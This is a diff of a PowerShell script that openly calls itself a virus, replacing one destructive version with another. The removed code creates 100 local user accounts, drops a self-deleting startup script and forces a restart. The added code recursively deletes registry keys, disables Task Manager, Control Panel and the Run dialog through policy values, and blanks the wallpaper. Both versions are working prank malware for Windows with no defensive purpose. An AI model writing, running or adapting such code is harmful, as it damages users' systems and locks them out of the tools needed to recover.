@@ -1,65 +1,59 @@
-Add-Type -TypeDefinition @"
-using System.Windows.Forms;
-public class WarningBox {
-    public static DialogResult Show() {
-        return MessageBox.Show("Warning: A virus has been detected!\nDo you want to launch it?", "Virus Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
-    }
-}
-"@ -Language CSharp
+# Check if the virus has already been run
+$virusEnabled = Get-ItemProperty -Path "HKCU:\Software\VirusStatus" -Name "VirusEnabled" -ErrorAction SilentlyContinue
 
-$choice = [WarningBox]::Show()
-
-if ($choice -eq "No") {
-    Write-Host "Virus execution canceled." -ForegroundColor Green
+if ($virusEnabled -eq $null) {
+    # First-time execution: enable the virus
+    Set-ItemProperty -Path "HKCU:\Software" -Name "VirusEnabled" -Value "ON"
+} else {
+    # Virus has already been executed before; close itself
+    Write-Host "Virus already executed. Exiting..." -ForegroundColor Red
     exit
 }
 
-Write-Host "This is virus" -ForegroundColor Red
-Start-Sleep -Seconds 3
+# Start virus execution
+try {
+    Write-Host "This is virus" -ForegroundColor Red
+    Start-Sleep -Seconds 3
 
-# Change shortcut and folder icons randomly
-$iconPaths = @(
-    "C:\Windows\System32\shell32.dll,4",
-    "C:\Windows\System32\imageres.dll,7",
-    "C:\Windows\System32\shell32.dll,20",
-    "C:\Windows\System32\imageres.dll,34"
-)
+    # Remove non-essential registry keys
+    $nonEssentialRegistryKeys = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall",     # Uninstall keys
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", # Recent commands
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", # Shell folders
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" # Explorer advanced settings
+    )
 
-$registryKeys = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.lnk\UserChoice", # Shortcuts
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.folder\UserChoice" # Folders
-)
-
-foreach ($key in $registryKeys) {
-    if (Test-Path $key) {
-        Set-ItemProperty -Path $key -Name "DefaultIcon" -Value ($iconPaths | Get-Random)
+    foreach ($key in $nonEssentialRegistryKeys) {
+        if (Test-Path $key) {
+            Remove-Item -Path $key -Recurse -Force
+            Write-Host "Removed registry: $key" -ForegroundColor Yellow
+        }
     }
+
+    # Disable certain system features by removing entries in registry
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoControlPanel" -Value 1 -Force
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRun" -Value 1 -Force
+
+    # Change background to black
+    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value ""
+    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+    # Disable Task Manager (classic method)
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
+
+    # Wait and display a message
+    Start-Sleep -Seconds 2
+    Write-Host "Virus executed successfully! Your system is compromised." -ForegroundColor Red
+
+    # Indicate that the virus should not run again
+    Set-ItemProperty -Path "HKCU:\Software" -Name "VirusEnabled" -Value "OFF"
+
+} catch {
+    Write-Host "Error occurred. Retrying..." -ForegroundColor Red
+    # If any error occurs, retreat the virus and exit gracefully
+    Set-ItemProperty -Path "HKCU:\Software" -Name "VirusEnabled" -Value "OFF"
+    exit
 }
 
-# Change desktop background to black
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value ""
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-
-# Create 100 fake accounts
-for ($i=1; $i -le 100; $i++) {
-    $username = "HackedUser$i"
-    New-LocalUser -Name $username -Password (ConvertTo-SecureString "Virus123!" -AsPlainText -Force) -AccountNeverExpires -PasswordNeverExpires -UserMayChangePassword $false
-    Add-LocalGroupMember -Group "Users" -Member $username
-}
-
-# Create a startup script that shows "Your PC is hacked!1!" and removes the main virus
-$startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hacked.ps1"
-$virusScriptPath = $MyInvocation.MyCommand.Path
-
-$scriptContent = @'
-Write-Host "Your PC is hacked!1!" -ForegroundColor Green
-Start-Sleep -Seconds 5
-Remove-Item -Path "' + $virusScriptPath + '" -Force
-Remove-Item -Path $MyInvocation.MyCommand.Path -Force
-'@
-
-$scriptContent | Out-File -FilePath $startupScript -Encoding UTF8
-
-# Restart the computer to apply all chaos
-Start-Sleep -Seconds 2
-Restart-Computer -Force
+# After execution, the virus "disables" itself
+exit
